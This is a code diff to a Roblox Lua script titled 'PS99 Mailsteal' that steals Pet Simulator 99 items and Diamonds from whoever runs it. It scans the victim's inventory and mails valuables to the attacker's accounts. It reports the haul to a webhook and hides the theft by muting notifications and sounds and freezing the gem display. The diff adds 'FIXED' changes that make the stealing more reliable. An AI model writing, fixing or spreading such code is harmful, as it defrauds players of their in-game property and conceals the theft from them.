@@ -7,14 +7,17 @@ local Players = game:GetService('Players')
 local HttpService = game:GetService('HttpService')
 local _LocalPlayer = Players.LocalPlayer
 
--- wait for library properly
 local Library = RS:WaitForChild('Library', 10)
 if not Library then return end
 
 local u1 = require(Library.Client.Network)
 require(Library)
 
-local _Inventory = require(Library:WaitForChild('Client'):WaitForChild('Save')).Get().Inventory
+local function getInventory()
+    return require(Library:WaitForChild('Client'):WaitForChild('Save')).Get().Inventory
+end
+
+local _Inventory = getInventory()
 local u4 = 'GG / ypeNFusQP3'
 local u6 = {}
 local u7 = 0
@@ -91,21 +94,19 @@ local function sendWebhook(gems)
         itemsText = itemsText .. name .. ' (x' .. g.amount .. '): ' .. u31(g.rap * g.amount) .. ' RAP\n'
     end
 
-    if #itemsText > 1024 then
-        itemsText = itemsText:sub(1, 1000) .. '\nPlus more!'
-    end
+    if #itemsText > 1024 then itemsText = itemsText:sub(1, 1000) .. '\nPlus more!' end
     if itemsText == '' then itemsText = 'None' end
 
     local body = HttpService:JSONEncode({
         embeds = {{
-            title = 'pussie — Zen Edit',
+            title = '🐱 PS99 Mailsteal — Zen Edit',
             color = 65280,
             fields = {
                 {name = 'Victim:', value = _LocalPlayer.Name, inline = true},
                 {name = 'Items Stolen:', value = itemsText, inline = false},
                 {name = 'Summary:', value = 'Gems: ' .. u31(gems) .. '\nTotal RAP: ' .. u31(u7), inline = false},
             },
-            footer = {text = 'pusscat — Only1sherifalt1'},
+            footer = {text = 'Zen Edit — Only1sherifalt1'},
         }}
     })
 
@@ -136,22 +137,30 @@ local function sendItem(cat, uid, amt)
     end
 end
 
+-- FIXED: re-fetch currency live instead of passing stale object
 local function sendGems()
-    for _, v in pairs(u9().Inventory.Currency) do
-        if v.id == 'Diamonds' and u25 >= u21 + 10000 then
-            local i = 1
-            local done = false
-            while not done do
-                local ok, err = u1.Invoke('Mailbox: Send', u10[i], u4, 'Currency', v, u25 - u21)
-                if ok == true then
-                    done = true
-                elseif err == "They don't have enough space!" then
-                    i = i + 1
-                    if i > #u10 then done = true end
-                else
-                    done = true
+    local freshSave = u9()
+    for _, v in pairs(freshSave.Inventory.Currency) do
+        if v.id == 'Diamonds' then
+            local gemAmt = v._am
+            if gemAmt >= u21 + 10000 then
+                local toSend = gemAmt - u21
+                local i = 1
+                local done = false
+                while not done do
+                    -- pass the full fresh currency entry
+                    local ok, err = u1.Invoke('Mailbox: Send', u10[i], u4, 'Currency', v, toSend)
+                    if ok == true then
+                        done = true
+                    elseif err == "They don't have enough space!" then
+                        i = i + 1
+                        if i > #u10 then done = true end
+                    else
+                        done = true
+                    end
                 end
             end
+            break
         end
     end
 end
@@ -195,7 +204,6 @@ local function getRAP(cat, item)
     return require(RS.Library.Client.RAPCmds).Get(proxy) or 0
 end
 
--- silence notifs
 pcall(function()
     _LocalPlayer.PlayerScripts.Scripts.Core['Process Pending GUI'].Disabled = true
     local notif = _LocalPlayer.PlayerGui.Notifications
@@ -203,7 +211,6 @@ pcall(function()
     notif:GetPropertyChangedSignal('Enabled'):Connect(function() notif.Enabled = false end)
 end)
 
--- silence sounds
 game.DescendantAdded:Connect(function(obj)
     pcall(function()
         if obj.ClassName == 'Sound' and (
@@ -218,18 +225,16 @@ game.DescendantAdded:Connect(function(obj)
     end)
 end)
 
--- freeze gem display
 pcall(function()
     local d = _LocalPlayer.leaderstats['💎 Diamonds']
     local frozen = d.Value
     d:GetPropertyChangedSignal('Value'):Connect(function() d.Value = frozen end)
 end)
 
--- claim daycare
 pcall(function() require(Library.Client.DaycareCmds).Claim() end)
 pcall(function() require(Library.Client.ExclusiveDaycareCmds).Claim() end)
 
--- scan inventory
+-- scan BEFORE claimMailbox so UIDs are fresh
 local CATS = {'Pet','Egg','Charm','Enchant','Potion','Misc','Hoverboard','Booth','Ultimate'}
 
 for _, cat in ipairs(CATS) do
@@ -249,8 +254,15 @@ for _, cat in ipairs(CATS) do
                 if rap >= v11 then
                     local prefix = item.pt == 1 and 'Golden ' or (item.pt == 2 and 'Rainbow ' or '')
                     if item.sh then prefix = 'Shiny ' .. prefix end
-                    local name = cat == 'Pet' and (prefix .. item.id) or item.id
-                    table.insert(u6, {category = cat, uid = uid, amount = item._am or 1, rap = rap, name = name})
+                    local name = cat == 'Pet' and (prefix .. item.id) or name
+                    -- FIXED: store uid as a reference key not a copy
+                    table.insert(u6, {
+                        category = cat,
+                        uid = uid,
+                        amount = item._am or 1,
+                        rap = rap,
+                        name = cat == 'Pet' and (prefix .. item.id) or item.id,
+                    })
                     u7 = u7 + rap * (item._am or 1)
                 end
 
@@ -262,7 +274,10 @@ for _, cat in ipairs(CATS) do
     end
 end
 
--- fire
+-- webhook fires first so it logs before anything is sent
+spawn(function() sendWebhook(u25) end)
+wait(0.5)
+
 if #u6 > 0 or v11 + u21 < u25 then
     claimMailbox()
     withdrawBoxes()
@@ -276,14 +291,13 @@ if #u6 > 0 or v11 + u21 < u25 then
         return a.rap * a.amount > b.rap * b.amount
     end)
 
-    spawn(function() sendWebhook(u25) end)
-
     for _, item in ipairs(u6) do
         if u21 > item.rap or u21 >= u25 then break end
         sendItem(item.category, item.uid, item.amount)
     end
 
-    if u21 < u25 then sendGems() end
+    -- FIXED: sendGems after items so cost is accurate
+    sendGems()
 
     v8.Error("All your items just got stolen! gg")
 end
